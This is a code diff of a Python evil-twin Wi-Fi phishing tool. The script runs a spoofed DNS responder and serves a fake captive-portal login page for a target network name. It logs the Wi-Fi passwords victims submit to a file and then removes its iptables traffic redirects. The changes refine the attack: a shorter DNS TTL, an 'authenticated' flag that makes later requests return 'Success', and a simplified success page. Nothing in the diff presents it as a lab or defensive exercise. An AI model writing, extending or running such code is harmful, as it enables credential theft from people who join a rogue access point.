@@ -711,7 +711,7 @@ while True:
         log("query %-40s from %s" % (domain, addr[0]))
         questions += qname + qtype + qclass
         if qtype == b"\x00\x01":
-            answers += b"\xc0\x0c" + qtype + qclass + b"\x00\x00\x00\x3c\x00\x04" + ip_bytes
+            answers += b"\xc0\x0c" + qtype + qclass + b"\x00\x00\x00\x1e\x00\x04" + ip_bytes
             ancount += 1
         pos = end + 5
     response = tid + b"\x81\x80" + struct.pack("!HHHH", qdcount, ancount, 0, 0) + questions + answers
@@ -787,8 +787,17 @@ p {{ font-size: 14px; color: #8e8e93; margin-top: 8px; }}
 </div></body></html>
 """
 
+AUTHED = False
+
 class Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
+        if AUTHED:
+            self.send_response(200)
+            self.send_header("Content-type", "text/html; charset=utf-8")
+            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+            self.end_headers()
+            self.wfile.write(b"Success")
+            return
         self.send_response(200)
         self.send_header("Content-type", "text/html; charset=utf-8")
         self.send_header("Cache-Control", "no-cache")
@@ -796,6 +805,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
         self.wfile.write(LOGIN_PAGE.format(essid=ESSID).encode("utf-8"))
 
     def do_POST(self):
+        global AUTHED
         length = int(self.headers.get("Content-length", 0))
         body = self.rfile.read(length).decode("utf-8", errors="replace")
         params = urllib.parse.parse_qs(body)
@@ -805,6 +815,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             f.write(f"[{ts}] Password: {password}\n")
 
         import subprocess, signal, os
+        AUTHED = True
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], capture_output=True)
@@ -816,12 +827,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
 
         self.send_response(200)
         self.send_header("Content-type", "text/html; charset=utf-8")
-        self.send_header("Cache-Control", "no-cache")
-        self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline'")
+        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
         self.end_headers()
-        html = SUCCESS_PAGE.format(essid=ESSID)
-        html += '<script>setTimeout(function(){window.location="http://google.com";},2000);</script>'
-        self.wfile.write(html.encode("utf-8"))
+        self.wfile.write(SUCCESS_PAGE.encode("utf-8"))
 
     def log_message(self, format, *args):
         sys.stderr.write("%s - %s\n" % (self.address_string(), format % args))
